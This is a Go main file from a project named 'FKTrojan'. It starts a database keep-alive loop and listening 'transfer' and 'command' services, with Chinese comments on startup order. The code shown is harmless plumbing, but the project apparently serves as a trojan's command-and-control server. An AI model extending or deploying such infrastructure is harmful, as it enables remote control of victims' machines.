package main

import (
	"FKTrojan/config"
	"FKTrojan/database"
	. "FKTrojan/flog"
	"FKTrojan/service_command"
	"FKTrojan/service_transfer"
	"fmt"
)

func init() {
	config.Load()
	database.Init()
	fmt.Printf("init complete, running ...\n")
}
func main() {
	err := make(chan error)
	// 昨晚下班开始跑 今天过来看到有connect mysql失效错误
	// 客户端很久没请求会导致服务端不会连接mysql，从而导致超时连接失效
	go func() {
		err <- database.KeepAlive()
	}()
	// 先启动transfer,避免：收到command，要transfer，但是发现transfer还没启动
	go func() {
		err <- service_transfer.ListenAndServe()
	}()
	go func() {
		err <- service_command.ListenAndServe()
	}()

	Flog.Printf("error is %v", <-err)
}
